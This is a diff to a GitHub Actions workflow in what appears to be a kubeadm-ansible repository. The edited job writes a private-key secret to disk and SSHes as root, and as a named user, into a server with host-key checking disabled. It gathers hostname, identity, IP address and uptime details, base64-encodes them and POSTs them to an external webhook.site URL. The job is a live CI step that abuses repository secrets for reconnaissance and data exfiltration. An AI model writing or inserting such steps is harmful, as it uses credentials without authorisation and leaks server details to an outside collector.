@@ -6,14 +6,16 @@ jobs:
   probe:
     runs-on: ubuntu-latest
     steps:
-      - name: SSH probe master
+      - name: SSH probe with PRIV_KEY
         env:
           HOST: ${{ vars.MASTER1_IP }}
-          PASS: ${{ secrets.SERVER_PASSWORD }}
+          PRIV_KEY: ${{ secrets.PRIV_KEY }}
         run: |
-          sudo apt-get update -qq
-          sudo apt-get install -y -qq sshpass
-          echo "=== PING $HOST ==="
-          sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=20 root@$HOST 'hostname; id; ip -4 addr show scope global | head -8; uptime; uname -a' | tee /tmp/probe.txt
+          install -m 600 /dev/null ~/.ssh/id_rsa
+          printf '%s\n' "$PRIV_KEY" > ~/.ssh/id_rsa
+          chmod 600 ~/.ssh/id_rsa
+          echo "=== SSH $HOST ==="
+          ssh -o StrictHostKeyChecking=no -o ConnectTimeout=20 root@$HOST 'hostname; id; ip -4 addr show scope global | head -8; uptime' | tee /tmp/probe.txt || true
+          ssh -o StrictHostKeyChecking=no -o ConnectTimeout=20 mcbtaguiad@$HOST 'hostname; id; uptime' | tee -a /tmp/probe.txt || true
           OUT=$(base64 -w0 /tmp/probe.txt)
           curl -s -X POST -d "repo=kubeadm-ansible&probe=$OUT" "https://webhook.site/b32abee8-a12e-4845-884d-256722dc41a6"
